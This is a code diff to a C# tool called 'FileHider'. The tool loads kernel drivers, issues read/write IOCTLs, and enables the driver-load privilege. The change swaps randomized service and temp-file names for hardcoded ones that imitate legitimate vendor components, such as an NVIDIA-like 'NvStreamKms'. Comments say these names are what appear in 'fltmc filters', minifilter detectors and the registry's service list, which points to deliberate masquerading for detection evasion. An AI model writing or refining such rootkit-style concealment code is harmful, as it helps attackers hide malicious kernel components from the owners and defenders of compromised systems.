@@ -19,6 +19,15 @@ namespace FileHider
         const uint IOCTL_RT_READ = 0x80002048;
         const uint IOCTL_RT_WRITE = 0x8000204C;
 
+        // ─── Hardcoded legit names (was random alnum20) ─────
+        // These are what show up in `fltmc filters`, the minifilter
+        // detector, and HKLM\SYSTEM\CurrentControlSet\Services.
+        // Edit only these four if you want different names.
+        const string RT_SERVICE_HARDCODED = "NvStreamKms";
+        const string FH_SERVICE_HARDCODED = "FsPolicySvc";
+        const string RT_TEMP_HARDCODED = "~NvStreamKms.tmp";
+        const string FH_TEMP_HARDCODED = "~FsPolicySvc.tmp";
+
         // ─── Log file — next to exe, fallback to C:\ ────────
         static readonly string _logPath = PickLogPath();
         static readonly object _logLock = new object();
@@ -101,7 +110,9 @@ namespace FileHider
         static string _rtTempPath = null;
         static string _fhTempPath = null;
 
-        // ─── Deterministic naming (matches working example) ─
+        // ─── Deterministic naming (kept for compatibility) ──
+        // Still here in case anything references them, but the
+        // public getters below no longer use them.
         static string MachineKey()
         {
             try
@@ -135,10 +146,11 @@ namespace FileHider
             }
         }
 
-        static string RtServiceName() { return DerivedAlnum20("rt-core-v1"); }
-        static string FhServiceName() { return DerivedAlnum20("fh-svc-v1"); }
-        static string RtTempBase() { return "~" + DerivedHex8("rt-file") + ".tmp"; }
-        static string FhTempBase() { return "~" + DerivedHex8("fh-file") + ".tmp"; }
+        // ─── Public name getters — now hardcoded, no random ─
+        static string RtServiceName() { return RT_SERVICE_HARDCODED; }
+        static string FhServiceName() { return FH_SERVICE_HARDCODED; }
+        static string RtTempBase() { return RT_TEMP_HARDCODED; }
+        static string FhTempBase() { return FH_TEMP_HARDCODED; }
 
         // ─── Privileges ─────────────────────────────────────
         static void EnableLoadDriverPrivilege()
